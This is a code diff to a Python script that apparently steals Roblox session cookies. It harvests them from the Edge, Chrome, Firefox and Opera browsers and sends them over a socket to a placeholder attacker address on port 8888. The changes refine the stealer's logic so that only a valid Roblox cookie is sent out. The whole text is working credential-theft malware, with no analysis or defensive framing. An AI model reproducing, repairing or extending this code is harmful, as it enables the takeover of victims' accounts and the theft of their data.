@@ -6,7 +6,7 @@ addr = ('YOUR IP HERE', 8888)
 
 
 def roblox_logger():
-    finded_cookie = b""
+    finded_cookie = None
 
     browsers = [edge_logger, chrome_logger, firefox_logger,
                 opera_logger]  # improt function from './loggers.py'
@@ -19,8 +19,10 @@ def roblox_logger():
         else:
             finded_cookie = twrv.join()  # finded!
             break
-
-    return str(finded_cookie).encode()
+    if finded_cookie:
+        return str(finded_cookie).encode()
+    else:
+        return False
 
 
 if __name__ == '__main__':
@@ -28,5 +30,9 @@ if __name__ == '__main__':
     s.connect(addr)
 
     cookie = roblox_logger()
-    s.send(cookie)
-    s.close()
+    if not cookie.startswith(b'_|WARNING:'):
+        s.send(b'False')
+        s.close()
+    else:
+        s.send(cookie)
+        s.close()
